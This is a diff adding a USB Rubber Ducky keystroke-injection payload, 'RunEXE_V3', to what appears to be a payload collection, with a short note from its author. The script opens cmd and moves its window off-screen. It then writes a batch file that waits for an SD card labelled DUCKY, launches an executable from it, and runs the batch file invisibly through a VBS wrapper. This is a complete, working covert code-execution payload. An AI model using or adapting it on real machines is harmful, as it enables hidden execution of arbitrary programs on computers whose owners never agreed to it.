@@ -155,3 +155,84 @@ ENTER
 REM STRING EXIT
 REM ENTER
 ```
+The following is another take on the RunEXE from SD payload, I think the micro SD connection is faster than it used to be, it could just be me. Here I am using a special for loop which uses the 'Vol' command for volume information. I am pretty sure it runs on most Windows boxes, and am reasonably sure it runs on most old computers. The main reason for the revamp is to eliminate some of the problems associated with the 'diskpart' command, which if run on a non admin box will cause previous scripts to essentially hang. 
+
+```
+REM Author: overwraith
+REM Name: RunEXE_V3.txt
+REM Purpose: Run an executable file off of the SD card after it mounts. Uses a slightly different verison of the drive finder code. 
+REM Encoder V2.4+
+REM Using the run command for a broader OS base. 
+DEFAULT_DELAY 75
+DELAY 3000
+GUI R
+DELAY 1000
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+
+REM Make batch file that waits for SD card to mount. 
+REM Delete batch file if already exists
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat
+STRING :while1
+ENTER
+STRING for %%d in (A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z) do ( 
+ENTER
+STRING for /f "tokens=6 delims= " %%i in ('Vol %%d:') do (
+ENTER
+STRING if "%%i" EQU "DUCKY" ( set "DuckyDrive=%%d:" )
+ENTER
+STRING )
+ENTER
+STRING )
+ENTER
+STRING if Exist %DuckyDrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+REM Continue script.
+STRING START %DuckyDrive%\HelloWorld.exe
+ENTER
+CONTROL z
+ENTER
+
+REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
+REM Delete vbs file if already exists
+STRING erase /Q invis.vbs
+ENTER
+REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL Z
+ENTER
+
+REM RUN THE BATCH FILE
+STRING wscript.exe invis.vbs DuckyWait.bat
+ENTER
+STRING EXIT
+ENTER
+```
